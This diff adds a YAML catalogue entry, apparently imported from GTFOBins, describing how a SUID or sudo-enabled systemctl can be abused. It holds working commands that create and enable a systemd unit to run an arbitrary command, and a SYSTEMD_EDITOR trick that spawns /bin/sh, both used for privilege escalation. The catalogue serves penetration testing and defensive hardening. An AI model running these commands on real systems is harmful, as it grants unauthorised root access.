@@ -1,0 +1,118 @@
+id: gtfobins/systemctl/shell/suid
+type: binary
+platform: linux
+name: systemctl
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'echo ''[Service]
+
+    Type=oneshot
+
+    ExecStart=/path/to/command
+
+    [Install]
+
+    WantedBy=multi-user.target'' >/path/to/temp-file.service
+
+    systemctl link /path/to/temp-file.service
+
+    systemctl enable --now /path/to/temp-file.service'
+  comment: It might happen that the service is not started with `--now`, in such cases it might be necessary
+    to manually start it.
+references:
+- https://gtfobins.github.io/gtfobins/systemctl/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        systemctl:
+          functions:
+            inherit:
+            - code: systemctl
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: less
+            shell:
+            - code: 'echo ''[Service]
+
+                Type=oneshot
+
+                ExecStart=/path/to/command
+
+                [Install]
+
+                WantedBy=multi-user.target'' >/path/to/temp-file.service
+
+                systemctl link /path/to/temp-file.service
+
+                systemctl enable --now /path/to/temp-file.service'
+              comment: It might happen that the service is not started with `--now`, in such cases it
+                might be necessary to manually start it.
+              contexts:
+                sudo: null
+                suid: null
+            - code: 'echo /bin/sh >/path/to/temp-file
+
+                chmod +x /path/to/temp-file
+
+                SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target'
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/systemctl/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:ed4333a7cc3539d6126dacbe2803e0f9ef62fbb5382cbb2673c6ed928924259d
